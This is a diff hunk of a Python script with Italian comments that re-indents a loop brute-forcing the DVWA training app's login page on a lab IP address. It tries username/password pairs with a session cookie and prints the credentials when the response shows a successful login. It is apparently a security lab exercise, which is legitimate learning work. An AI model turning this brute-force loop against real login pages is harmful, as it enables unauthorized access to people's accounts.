@@ -33,29 +33,29 @@ for user in user_list:
             #escamotage grafico per cancellare la riga precedente, che non ha match positivo, che viene sovrascritta dalla successiva.
                 sys.stdout.write("\033[A")
                 sys.stdout.write("\033[K")
-                 #stampa user e pwd sulla stessa riga, separati dal "-"
-            print (user, "-", pwd)  
-            
-            #check degli headers contenenti nella richiesta di login                                
-            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
-            
-            #parametri da inserire per provare il bruteforce
-            post_par ={'username': user, 'password': pwd, 'Login':'Login'}
-            
-            #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
-            risp = requests.get('http://192.168.50.101/dvwa/vulnerabilities/brute/', post_par, cookies=Cookie, allow_redirects=False)
-            
-            #se il server non dà risposta, non abbiamo il phpsessid, e restituisce in output questo, chiudendo successivamente il ciclo col found a 1    
-            if(risp.text==""):
-                print(f"Session id errato")
-                found=1
-                break
-             #altrimenti, se nella risposta del server troviamo la scritta "Welcome to the...", il bruteforce è riuscito alla perfezione, dando in output il log in con le credenziali valide, restituisce 1 alla variabile found e chiude il ciclo       
-            elif(risp.text.find("Welcome to the") != -1):
-                print(f"\nLog in!\nuser: {user}\npassword: {pwd}\n\n\n") 
-                found=1
-                break
+                #stampa user e pwd sulla stessa riga, separati dal "-"
+                print (user, "-", pwd)  
                 
+                #check degli headers contenenti nella richiesta di login                                
+                headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
+                
+                #parametri da inserire per provare il bruteforce
+                post_par ={'username': user, 'password': pwd, 'Login':'Login'}
+                
+                #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
+                risp = requests.get('http://192.168.50.101/dvwa/vulnerabilities/brute/', post_par, cookies=Cookie, allow_redirects=False)
+                
+                #se il server non dà risposta, non abbiamo il phpsessid, e restituisce in output questo, chiudendo successivamente il ciclo col found a 1    
+                if(risp.text==""):
+                    print(f"Session id errato")
+                    found=1
+                    break
+                #altrimenti, se nella risposta del server troviamo la scritta "Welcome to the...", il bruteforce è riuscito alla perfezione, dando in output il log in con le credenziali valide, restituisce 1 alla variabile found e chiude il ciclo       
+                elif(risp.text.find("Welcome to the") != -1):
+                    print(f"\nLog in!\nuser: {user}\npassword: {pwd}\n\n\n") 
+                    found=1
+                    break
+                    
     if(found==1): 
         break
         
